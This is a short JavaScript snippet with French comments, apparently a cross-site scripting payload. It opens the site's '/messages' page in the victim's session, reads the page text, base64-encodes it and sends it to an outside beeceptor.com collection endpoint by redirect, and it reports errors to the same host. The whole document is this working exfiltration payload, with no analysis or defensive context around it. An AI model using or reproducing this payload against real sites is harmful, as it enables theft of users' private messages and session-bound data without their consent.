const a = window.open("/messages");

setTimeout(() => {
  try {
    if (!a || a.closed) throw new Error("Fenêtre introuvable ou fermée");
    const body = a.document && a.document.body;
    if (!body) throw new Error("Pas de body dans la page");

    // JSON brut du body
    const content = body.innerText.trim();
    document.location = "https://skavens.free.beeceptor.com/ok?" + btoa(content);

  } catch (err) {
    console.error("Erreur:", err);
    const encodedErr = btoa(String(err));
    document.location = "https://skavens.free.beeceptor.com/error?" + encodedErr;
  }
}, 2000);
